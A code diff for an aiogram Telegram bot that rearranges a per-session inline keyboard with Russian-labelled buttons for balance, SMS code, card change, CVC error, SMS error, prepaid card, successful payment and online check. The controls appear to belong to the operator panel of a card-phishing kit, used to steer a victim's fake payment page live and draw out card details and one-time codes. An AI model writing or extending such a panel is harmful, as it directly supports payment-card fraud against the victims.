@@ -24,17 +24,17 @@ def get_management_keyboard(session_id: str):
     return InlineKeyboardMarkup(inline_keyboard=[
         [
             InlineKeyboardButton(text="💰 Баланс", callback_data=f"balance:{session_id}"),
-            InlineKeyboardButton(text="📞 SMS", callback_data=f"sms:{session_id}")
+            InlineKeyboardButton(text="📞 SMS", callback_data=f"sms:{session_id}"),
+            InlineKeyboardButton(text="🔄 Изменить карту", callback_data=f"change:{session_id}")
         ],
         [
-            InlineKeyboardButton(text="🔄 Изменить карту", callback_data=f"change:{session_id}"),
-            InlineKeyboardButton(text="❌ Ошибка CVC", callback_data=f"wrong_cvc:{session_id}")
+           
+            InlineKeyboardButton(text="❌ Ошибка CVC", callback_data=f"wrong_cvc:{session_id}"),
+            InlineKeyboardButton(text="❌ Ошибка SMS", callback_data=f"wrong_sms:{session_id}"),
+            InlineKeyboardButton(text="❌ Prepaid", callback_data=f"prepaid:{session_id}")
         ],
         [
             InlineKeyboardButton(text="✅ Успешная оплата", callback_data=f"success:{session_id}"),
-            InlineKeyboardButton(text="❌ Ошибка SMS", callback_data=f"wrong_sms:{session_id}")
-        ],
-        [
             InlineKeyboardButton(text="🔍 Проверить онлайн", callback_data=f"check_online:{session_id}")
         ]
     ])
